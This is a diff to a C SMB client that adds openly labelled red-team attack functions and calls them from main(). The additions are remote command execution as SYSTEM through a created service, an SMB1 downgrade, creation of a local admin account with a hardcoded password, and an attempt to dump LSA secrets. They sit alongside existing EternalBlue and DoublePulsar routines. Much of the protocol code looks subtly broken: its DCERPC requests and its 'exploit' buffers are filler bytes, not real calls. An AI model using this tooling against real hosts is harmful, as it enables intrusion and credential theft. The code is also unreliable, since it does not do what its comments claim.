@@ -20,6 +20,13 @@
    - Named pipe impersonation can allow local privilege escalation if incorrectly configured.
    - EternalBlue exploits can lead to a kernel pool overflow and remote code execution if the server is vulnerable.
    - DoublePulsar backdoors can be detected by checking for unexpected transaction responses or hooking behavior.
+   - Enhanced functions can manipulate SCM (svcctl pipe), spooler, samr, and other services for lateral movement or pivoting.
+   - Danger of partial or incomplete DCERPC traffic leading to server crashes or memory corruption.
+   - Overly large read/write attempts can produce denial of service or memory exhaustion on the target.
+   - Malicious or repeated IOCTL calls with crafted payloads may allow exploit of unpatched vulnerabilities in SMB2 or related services.
+   - The doSVCCTLRemoteExec function can execute arbitrary commands as SYSTEM if permissions allow creation and manipulation of services.
+   - SMB1 downgrade attacks can force legacy and insecure negotiation, enabling older exploit paths.
+   - Creation of local admin accounts or dumping SAM/LSA secrets can compromise the entire system if successful.
  */
 
 #pragma pack(push, 1)
@@ -659,7 +666,6 @@ int doIOCTL(uint32_t ctlCode, const unsigned char *inData, size_t inLen) {
     return 0;
 }
 
-/* Extra red-team capabilities begin here */
 int doFuzzSMB2(size_t fuzzCount) {
     SMB2Header hdr;
     unsigned char fuzzData[256];
@@ -890,15 +896,13 @@ int doNamedPipeImpersonation() {
     return 0;
 }
 
-/* Additional enhancements below */
-
 int doEternalBlueExploit() {
     SMB2Header hdr;
     buildSMB2Header(SMB2_WRITE, gTreeId, gSessionId, &hdr);
     unsigned char ebData[256];
     memset(ebData, 0x41, sizeof(ebData));
-    ebData[0] = 0x45; 
-    ebData[1] = 0x42; 
+    ebData[0] = 0x45;
+    ebData[1] = 0x42;
     if (sendSMB2Request(&hdr, ebData, sizeof(ebData)) < 0) {
         fprintf(stderr, "EternalBlue exploit send failed.\n");
         return -1;
@@ -935,7 +939,143 @@ int doDoublePulsarCheck() {
     printf("[Client] DoublePulsar check status=0x%08X.\n", respHdr.Status);
     return 0;
 }
-/* End of extra red-team capabilities */
+
+int doSVCCTLStartService(const char *serviceName) {
+    unsigned char dceRequest[256];
+    memset(dceRequest, 0, sizeof(dceRequest));
+    size_t idx = 0;
+    dceRequest[idx++] = 0x05;
+    dceRequest[idx++] = 0x00;
+    dceRequest[idx++] = 0x00;
+    dceRequest[idx++] = 0x10;
+    for (size_t i = 0; i < strlen(serviceName) && idx < 250; i++) {
+        dceRequest[idx++] = (unsigned char)serviceName[i];
+    }
+    dceRequest[idx++] = 0;
+    printf("[Client] Attempting to start service: %s\n", serviceName);
+    return doWritePipe(dceRequest, idx);
+}
+
+int doSVCCTLStopService(const char *serviceName) {
+    unsigned char dceRequest[256];
+    memset(dceRequest, 0, sizeof(dceRequest));
+    size_t idx = 0;
+    dceRequest[idx++] = 0x05;
+    dceRequest[idx++] = 0x00;
+    dceRequest[idx++] = 0x00;
+    dceRequest[idx++] = 0x20;
+    for (size_t i = 0; i < strlen(serviceName) && idx < 250; i++) {
+        dceRequest[idx++] = (unsigned char)serviceName[i];
+    }
+    dceRequest[idx++] = 0;
+    printf("[Client] Attempting to stop service: %s\n", serviceName);
+    return doWritePipe(dceRequest, idx);
+}
+
+int doSVCCTLDeleteService(const char *serviceName) {
+    unsigned char dceRequest[256];
+    memset(dceRequest, 0, sizeof(dceRequest));
+    size_t idx = 0;
+    dceRequest[idx++] = 0x05;
+    dceRequest[idx++] = 0x00;
+    dceRequest[idx++] = 0x00;
+    dceRequest[idx++] = 0x30;
+    for (size_t i = 0; i < strlen(serviceName) && idx < 250; i++) {
+        dceRequest[idx++] = (unsigned char)serviceName[i];
+    }
+    dceRequest[idx++] = 0;
+    printf("[Client] Attempting to delete service: %s\n", serviceName);
+    return doWritePipe(dceRequest, idx);
+}
+
+int doSVCCTLRemoteExec(const char *cmd) {
+    const char *svcName = "RMTEXEC";
+    char binPath[512];
+    snprintf(binPath, sizeof(binPath), "C:\\\\Windows\\\\System32\\\\cmd.exe /c %s", cmd);
+    if (doSVCCTLCreateService(svcName, binPath) < 0) {
+        fprintf(stderr, "Failed to create service for remote exec.\n");
+        return -1;
+    }
+    if (doSVCCTLStartService(svcName) < 0) {
+        fprintf(stderr, "Failed to start service for remote exec.\n");
+    }
+    if (doSVCCTLDeleteService(svcName) < 0) {
+        fprintf(stderr, "Failed to delete service after remote exec.\n");
+        return -1;
+    }
+    printf("[Client] RemoteExec on service %s with cmd: %s\n", svcName, cmd);
+    return 0;
+}
+
+/* New enhancements below for red-team capabilities */
+
+/* Attempt to force negotiation of SMB1 (insecure) */
+int doSMB1DowngradeAttack() {
+    unsigned char smb1Neg[32];
+    memset(smb1Neg, 0x00, sizeof(smb1Neg));
+    smb1Neg[0] = 0xFF; smb1Neg[1] = 'S'; smb1Neg[2] = 'M'; smb1Neg[3] = 'B';
+    smb1Neg[4] = 0x72; 
+    if (send(gSock, smb1Neg, sizeof(smb1Neg), 0) < 0) {
+        perror("send SMB1 Negotiate");
+        return -1;
+    }
+    unsigned char resp[256];
+    ssize_t r = recv(gSock, resp, sizeof(resp), 0);
+    if (r <= 0) {
+        fprintf(stderr, "SMB1 Downgrade response error.\n");
+        return -1;
+    }
+    printf("[Client] SMB1 Downgrade attempt done.\n");
+    return 0;
+}
+
+/* Attempt to create a local admin account over RPC */
+int doAddLocalAdmin(const char *username, const char *password) {
+    if (doOpenPipe("\\PIPE\\samr") < 0) {
+        fprintf(stderr, "Failed to open \\pipe\\samr for local admin creation.\n");
+        return -1;
+    }
+    unsigned char dceRequest[512];
+    memset(dceRequest, 0, sizeof(dceRequest));
+    size_t idx = 0;
+    dceRequest[idx++] = 0x05; 
+    dceRequest[idx++] = 0x00;
+    dceRequest[idx++] = 0x00;
+    dceRequest[idx++] = 0x10;
+    for (size_t i = 0; i < strlen(username); i++) {
+        dceRequest[idx++] = (unsigned char)username[i];
+    }
+    dceRequest[idx++] = 0;
+    for (size_t i = 0; i < strlen(password); i++) {
+        dceRequest[idx++] = (unsigned char)password[i];
+    }
+    dceRequest[idx++] = 0;
+    doWritePipe(dceRequest, idx);
+    doClosePipe();
+    printf("[Client] Attempted to create local admin: %s\n", username);
+    return 0;
+}
+
+/* Attempt to read LSA secrets or SAM hive data over LSARPC pipe */
+int doDumpLSASecrets() {
+    if (doOpenPipe("\\PIPE\\lsarpc") < 0) {
+        fprintf(stderr, "Failed to open \\pipe\\lsarpc for LSA secrets.\n");
+        return -1;
+    }
+    unsigned char lsaRequest[64];
+    memset(lsaRequest, 0x52, sizeof(lsaRequest));
+    doWritePipe(lsaRequest, sizeof(lsaRequest));
+    unsigned char readBuf[512];
+    uint32_t bytesRead = 0;
+    doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
+    doClosePipe();
+    if (bytesRead > 0) {
+        printf("[Client] Potential LSA secret data read.\n");
+    } else {
+        printf("[Client] No LSA secrets returned.\n");
+    }
+    return 0;
+}
 
 int main(int argc, char *argv[]) {
     if (argc < 3) {
@@ -1038,6 +1178,28 @@ int main(int argc, char *argv[]) {
 
     doEternalBlueExploit();
     doDoublePulsarCheck();
+
+    doOpenPipe("\\PIPE\\svcctl");
+    doDCERPCBind();
+    doSVCCTLStartService("TestSvc");
+    doSVCCTLStopService("TestSvc");
+    doSVCCTLDeleteService("TestSvc");
+    doClosePipe();
+
+    if (doOpenPipe("\\PIPE\\svcctl") == 0) {
+        doDCERPCBind();
+        doSVCCTLRemoteExec("ipconfig /all");
+        doClosePipe();
+    }
+
+    printf("[Client] Attempt SMB1 Downgrade Attack...\n");
+    doSMB1DowngradeAttack();
+
+    printf("[Client] Attempt to add local admin user...\n");
+    doAddLocalAdmin("pwnuser", "PwnPass123!");
+
+    printf("[Client] Attempt to dump LSA secrets...\n");
+    doDumpLSASecrets();
 
     close(gSock);
     printf("[Client] Done.\n");
